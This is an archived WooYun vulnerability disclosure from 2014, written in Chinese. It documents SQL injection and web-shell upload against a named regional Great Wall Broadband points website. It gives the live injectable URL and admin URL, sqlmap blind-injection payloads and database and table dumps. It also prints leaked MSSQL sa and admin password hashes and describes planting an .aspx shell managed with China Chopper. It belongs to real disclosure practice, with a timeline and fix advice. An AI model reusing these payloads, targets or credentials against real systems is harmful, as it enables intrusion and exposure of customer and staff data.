<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		某地区长城宽带SQL注入漏洞+getshell（详细过程与影响证明）  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		某地区长城宽带SQL注入漏洞+getshell（详细过程与影响证明）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/23号">23号</a> 
</li><li>提交时间：		2014-04-13 12:55</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2014-04-13：	细节已通知厂商并且等待厂商处理中<br/>
									2014-04-18：	厂商已经确认，细节仅向厂商公开<br/>
									2014-04-28：	细节向核心白帽子及相关领域专家公开<br/>
									2014-05-08：	细节向普通白帽子公开<br/>
									2014-05-18：	细节向实习白帽子公开<br/>
									2014-05-28：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">注入漏洞已get shell</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">http://point.gzgwbn.net.cn/newsinfo.aspx?nid=72 注入点在这里<br />
<br />
<br />
<br />
</p><pre><code>Place: GET<br />
Parameter: nid<br />
    Type: boolean-based blind<br />
    Title: AND boolean-based blind - WHERE or HAVING clause<br />
    Payload: nid=72 AND 8365=8365<br />
<br />
    Type: AND/OR time-based blind<br />
    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)<br />
    Payload: nid=-6303 OR 2019=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)</code></pre><p class='detail'><br />
<br />
available databases [9]:<br />
<br />
[*] Appreciation<br />
<br />
[*] GZGWBN_Points<br />
<br />
[*] GZGWBN_WPF<br />
<br />
[*] GZGWBN_WPF1<br />
<br />
[*] GZGWBN_WPF2<br />
<br />
[*] master<br />
<br />
[*] model<br />
<br />
[*] msdb<br />
<br />
[*] tempdb<br />
<br />
9个库子<br />
<br />
</p><pre><code>Database: GZGWBN_Points<br />
[81 tables]<br />
+--------------------------------+<br />
| A111                           |<br />
| A_2012_0507                    |<br />
| AoYun2012_Answer               |<br />
| AoYun2012_Answer_Bak           |<br />
| AoYun2012_Result               |<br />
| ApplyOTT                       |<br />
| ApplySignUp                    |<br />
| Bak_sys_custb                  |<br />
| D99_Tmp                        |<br />
| GZ_Lottery                     |<br />
| GZ_Lottery_PlayNums            |<br />
| GZ_Point_BatchDeal             |<br />
| GZ_Point_V_Quantity_GoodsBook  |<br />
| GZ_Summer_Lottery              |<br />
| PackageSatisticsList           |<br />
| ProductPayNum                  |<br />
| Questionnaire                  |<br />
| VPoint_Donation_Before_2006    |<br />
| V_Commentary                   |<br />
| V_CustomerPoint                |<br />
| V_DealInfo                     |<br />
| V_Deal_RowColumn               |<br />
| V_GZ_Lottery                   |<br />
| V_Goods_NowQuan                |<br />
| V_Lottery_CountByDays          |<br />
| V_Lottery_CountByGoods         |<br />
| V_Lottery_CountBySH            |<br />
| V_QuantityStatistics           |<br />
| V_Quantity_Active_Book_GrowDay |<br />
| V_Quantity_Active_SH           |<br />
| V_Quantity_GoodsBook           |<br />
| V_Summer_Lottery               |<br />
| V_Summer_Lottery_CountByDays   |<br />
| custbb                         |<br />
| hd_ganentb                     |<br />
| scoretbb                       |<br />
| shop_basetb                    |<br />
| shop_goodoneclasstb            |<br />
| shop_goodstb                   |<br />
| shop_goodtwoclasstb            |<br />
| shop_helptb                    |<br />
| shop_huantb                    |<br />
| shop_nclasstb                  |<br />
| shop_newstb                    |<br />
| shop_notetb                    |<br />
| shop_saytb                     |<br />
| shop_scoretb                   |<br />
| shop_selecttb                  |<br />
| shop_usertb                    |<br />
| sys_admintb                    |<br />
| sys_biantb                     |<br />
| sys_blackcustb                 |<br />
| sys_caotb                      |<br />
| sys_cuntb                      |<br />
| sys_custb                      |<br />
| sys_dealtb                     |<br />
| sys_emailtb                    |<br />
| sys_hourtb                     |<br />
| sys_ozhantb                    |<br />
| sys_protb                      |<br />
| sys_qutb                       |<br />
| sys_scoretb                    |<br />
| sys_useremailtb                |<br />
| sys_xingtb                     |<br />
| sys_xitb                       |<br />
| sys_yingtb                     |<br />
| sys_zhantb                     |<br />
| sys_zhantbbak                  |<br />
| sys_zhetb                      |<br />
| sysdiagrams                    |<br />
| tEmailCount                    |<br />
| tb_Luckydraw                   |<br />
| tb_phoneActivate               |<br />
| tb_sports_310                  |<br />
| tb_sports_country              |<br />
| tb_sports_help                 |<br />
| tb_sports_main                 |<br />
| tb_sports_mybet                |<br />
| tb_sports_ssname               |<br />
| tb_sports_user                 |<br />
| vProductPayNum</code></pre><p class='detail'> 挑了个库子跑表<br />
<br />
别的库子里还有员工工资和银行卡号等信息，库实在太大了，跑的抗不住啊亲<br />
<br />
还是SA权限</p><pre><code>database management system users password hashes:<br />
[*] BBSA [1]:<br />
    password hash: 0x010011a6742cfce6ff23c521222535662f07ebfcc6d2322c6462<br />
        header: 0x0100<br />
        salt: 11a6742c<br />
        mixedcase: fce6ff23c521222535662f07ebfcc6d2322c6462<br />
<br />
[*] sa [1]:<br />
    password hash: 0x01004086ceb665942725e30e13ba2f7425abeb2c1cd1612c7b3b<br />
        header: 0x0100<br />
        salt: 4086ceb6<br />
        mixedcase: 65942725e30e13ba2f7425abeb2c1cd1612c7b3b</code></pre><p class='detail'><br />
<br />
后台很好找：http://point.gzgwbn.net.cn/admin/login.aspx<br />
<br />
跑表得出</p><pre><code>+-----+----------------------------------+-------+<br />
| uid | upwd                             | uname |<br />
+-----+----------------------------------+-------+<br />
| 1   | C922206634F4C33F728138ED57B6246B | admin |<br />
| 4   | &lt;blank&gt;                          | NULL  |<br />
+-----+----------------------------------+-------+</code></pre><p class='detail'><br />
<br />
<br />
<br />
登录后台后发现FCKeditor上传，顿时死的心都有了，我白费劲了，但是发现此FCK上传不能利用，至少我这个彩笔是没那本事。。。</p><pre><code>http://point.gzgwbn.net.cn/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http%3A%2F%2Fpoint.gzgwbn.net.cn%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Faspx%2Fconnector.aspx</code></pre><p class='detail'><br />
<br />
愁苦中意外发现后台传幻灯片的地方可以直接上传.aspx 顿时艳阳高照啊！！</p><p class="detail"><a href="../images/1119362286a29a41a3c0b43463c0ea9376a73e06.jpg" target="_blank"><img src="../images/1119362286a29a41a3c0b43463c0ea9376a73e06.jpg" alt="99.jpg" width="600"/></a></p><p class="detail"> 到这里就算了，主要我用的这个长城宽带过了12点总掉线，给打电话投诉还没人接，大小也是一ISP啊！！所以。。但是纯属友情检测，绝对没有删改东西。 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">就传2个菜刀截图吧*-*<br />
<br />
</p><p class="detail"><a href="../images/11194051300d4c6536a746664772e45ed2019745.jpg" target="_blank"><img src="../images/11194051300d4c6536a746664772e45ed2019745.jpg" alt="11.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/111941529b84f3c1854d644c0ac9e656f18d8b90.jpg" target="_blank"><img src="../images/111941529b84f3c1854d644c0ac9e656f18d8b90.jpg" alt="22.jpg" width="600"/></a></p><p class="detail"> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">过滤参数，修复FCKeditor上传，最最重要是保证网络稳定啊亲，我不想半夜掉线了。 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/23号" title="23号">23号</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-056728" title="某地区长城宽带SQL注入漏洞+getshell（详细过程与影响证明）">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：14 </p>
													<p class="detail">确认时间：2014-04-18 09:18</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">CNVD确认并复现所述情况（仅验证第一道风险，SQL注入），已经由CNVD通过以往联系渠道，将通报发送至 和中处置。 </p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="56728";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
